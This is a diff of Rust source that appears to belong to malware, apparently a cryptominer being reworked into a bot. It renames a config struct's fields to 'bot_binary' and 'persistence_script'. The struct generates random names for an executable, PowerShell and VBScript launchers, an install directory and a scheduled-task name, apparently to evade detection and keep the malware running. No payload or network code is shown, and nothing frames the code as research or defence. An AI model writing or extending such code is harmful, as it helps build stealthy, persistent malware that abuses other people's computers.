@@ -4,9 +4,9 @@ use serde::{Deserialize, Serialize};
 
 #[derive(Serialize, Deserialize, Clone)]
 pub struct MorphConfig {
-    pub miner_exe: String,
+    pub bot_binary: String,
     pub config_file: String,
-    pub monitor_script: String,
+    pub persistence_script: String,
     pub launcher_script: String,
     pub install_dir: String,
     pub task_name: String,
@@ -35,9 +35,9 @@ impl MorphConfig {
         };
 
         MorphConfig {
-            miner_exe: gen_name("exe"),
+            bot_binary: gen_name("exe"),
             config_file: gen_name("dat"),
-            monitor_script: gen_name("ps1"),
+            persistence_script: gen_name("ps1"),
             launcher_script: gen_name("vbs"),
             install_dir: gen_task(), 
             task_name: gen_task(),
